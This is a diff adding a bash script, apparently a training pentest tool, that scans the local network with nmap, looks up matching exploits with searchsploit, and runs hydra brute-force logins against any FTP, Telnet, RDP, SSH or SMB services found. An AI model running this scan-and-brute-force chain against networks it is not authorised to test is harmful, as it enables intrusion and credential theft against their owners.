@@ -1,0 +1,236 @@
+#!/bin/bash
+# a script for scanning the LAN and finding vulnerabilities
+function NET() #find the network ip and hosts
+{
+mkdir Scan-results #new directory for the new files
+cd Scan-results
+RANGE=$(ip r |grep -v default |awk '{print $1}') #display the network ip and netmask			
+echo "Your network is $RANGE" |tee -a report-log #inject the network details to a file
+echo
+echo
+sleep 0.2 
+echo "Your network is about to be scanned"
+echo "+++++++++++++++++++++++++++++++++++"
+sleep 0.2
+echo |tee -a report-log
+echo |tee -a report-log 
+echo "[*]Nmap network scan started on $(date)" |tee -a report-log #display that the scan starts and the time and inject it to a file
+nmap $RANGE > nmap.file #inject the results into a file
+echo "[*]Nmap network scan started on $(date)"
+echo
+echo
+echo "$(cat nmap.file| grep -i "Nmap scan report for" |wc -l) Hosts Found" |tee -a report-log  #number of hosts found
+echo "-----------------------------------" |tee -a report-log 
+sleep 0.2
+IP=$(cat nmap.file| grep -i "Nmap scan report for" |awk '{print $5}') #the ip addresses the found
+for i in $IP
+do
+echo $i |tee -a report-log 
+done
+echo "-----------------------------------" |tee -a report-log 
+echo 
+for i in $IP 
+do
+echo
+echo
+sleep 0.2
+echo "======================================================================================="|tee -a report-log
+echo "[*]service scan started for $i on $(date)" |tee -a report-log 
+nmap $i -sV -p- > $i-scan
+echo "[*]service scan ended for $i on $(date)" |tee -a report-log 
+echo "======================================================================================="|tee -a report-log
+echo 
+echo
+done
+echo
+echo
+}
+
+
+function VULN() #enumerate and find vulnerabilities in the IP addresses we found
+{
+IP=$(cat nmap.file| grep -i "Nmap scan report for" |awk '{print $5}') #the ip addresses the found
+for y in $IP
+do
+echo "______________________________________________________________________________________________________"|tee -a report-log
+echo
+echo "[*]Nmap scan for vulnerabilities started for host $y on $(date)" |tee -a report-log 
+
+echo
+echo
+nmap $y -p- -sV --script=vuln -oX $y-vuln.xml 1> /dev/null #searching vulnerabilities using nmap script and saving to xml format.
+xsltproc $y-vuln.xml > $y-vuln.html #convert the xml format to html
+echo "[*]Nmap scan for vulnerabilities ended for host $y on $(date)" |tee -a report-log
+echo "_______________________________________________________________________________________________________"|tee -a report-log
+echo |tee -a report-log 
+echo 
+echo 
+echo "++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++" |tee -a report-log
+echo "[*]Vulnerability check using searchsploit for $y started on $(date)" |tee -a report-log
+searchsploit -v --nmap $y-vuln.xml > searchsploit-file-$y 2> /dev/null  #searching vulnerabilities using searchsploit.
+echo "[*]Vulnerability check using searchsploit for $y ended on $(date)" |tee -a report-log
+echo "++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"|tee -a report-log
+echo |tee -a report-log 
+echo
+done
+}
+
+function BRUTE()
+{
+echo "__________________________________________________________________________"
+echo "Please enter a user list to brute force (make sure to enter the full path)"
+read USERL #user list to brute force
+echo
+echo "Enter your choice: [1] for create password list [2] for specify password list"	
+read CHOISE
+case $CHOISE in #to choose for creating or specifing password list
+1)echo
+  echo "Make your own password list. please insert numbers and strings by the following : <min-len> <max-len> <characters-and-numbers>"
+  echo "For example: 2 4 aba34" 
+  read CPASS
+  crunch $CPASS -o yourpassword.lst #using crunch for creating password list
+  ;;
+2)echo
+  echo "Enter a password list to brute force (make sure to enter the full path)" #password list that exist in the user system
+   read PASS
+  ;; 
+esac
+
+for x in $(ls |grep scan) #the nmap scan files of each host
+do 
+IPAD=$(cat $x| grep -i "Nmap scan report for" |awk '{print $5}') #the ip addresses
+SERVICE=$(cat $x |awk '{print $3}' |egrep 'ftp|telnet|rdp|ssh|smb' |head -n1) #the login services of each ip
+if [ -z $SERVICE ] #if there is no login services
+then
+echo
+echo
+echo "[+]There is no open login services for host $IPAD" |tee -a report-log 
+sleep 0.2
+echo
+echo
+else
+echo
+echo
+echo
+sleep 0.2
+fi
+
+if [[ $CHOISE == 1 && -n $SERVICE ]] #if the user choose 1 and there is at least one login service
+then
+echo "[+]Starting brute force on $IPAD on $(date)" |tee -a report-log 
+hydra -L $USERL -P yourpassword.lst $IPAD $SERVICE > hydra-results-$IPAD #brute force attack and inject to a new file
+echo "[+]Brute force on $IPAD enden on $(date)"|tee -a report-log 
+elif [[ $CHOISE == 2 && -n $SERVICE ]] #if the user choose 2 and there is at least one login service
+then
+echo "[+]Starting brute force on $IPAD on $(date)" |tee -a report-log
+hydra -L $USERL -P $PASS $IPAD $SERVICE > hydra-results-$IPAD #brute force attack and inject to a new file
+echo "[+]Brute force on $IPAD ended/ on $(date)"|tee -a report-log 
+fi
+
+done
+}
+
+function SELECT()
+{
+n=0
+echo
+echo "{*}Select an IP to explore"
+echo
+for c in $IP
+do
+n=$(( n+1 ))
+echo "[$(echo $n)]" $c
+done
+
+read select
+export select_env=$select #set select variable as env variable in order to access this variable fron other functions
+echo
+echo
+}
+function FILES()
+{
+echo "{*}Select a file to explore"
+echo
+n=0
+for c in $IP
+do 
+n=$(( n+1 ))
+if [ $select_env == $n ]
+then
+
+n=0
+for d in $(ls *$c* nmap.file report-log)
+do
+n=$(( n+1 ))
+echo "[$(echo $n)]" $d
+done
+
+fi
+done
+
+n=0
+
+for c in $IP
+do 
+n=$(( n+1 ))
+if [ $select_env == $n ]
+then
+
+n=0
+read cho
+
+for d in $(ls *$c* nmap.file report-log)
+do
+n=$(( n+1 ))
+if [[ $cho == $n && $d != *html ]]
+then 
+echo
+echo
+echo " --------------------------------------------------------------------------------------------------"
+echo
+clear
+cat $d
+echo
+echo "---------------------------------------------------------------------------------------------------"
+echo
+echo
+elif [[ $cho == $n && $d == *html ]]
+then
+clear
+firefox $d 2> /dev/null
+echo
+echo
+fi
+done
+
+fi
+done 
+}
+
+
+function REPEAT()
+{
+	
+echo "[0] Exit"
+echo "[1] Go back to choose another file "
+echo "[2] Choose another IP"
+read reply
+case $reply in
+0)echo "[*] All the files has been saved to directory called :Scan-results, take a look!."
+exit
+;;
+1)FILES	
+;;
+2)SELECT
+  FILES
+;;
+esac
+REPEAT
+}
+
+NET
+VULN
+BRUTE
+SELECT
+FILES
+REPEAT
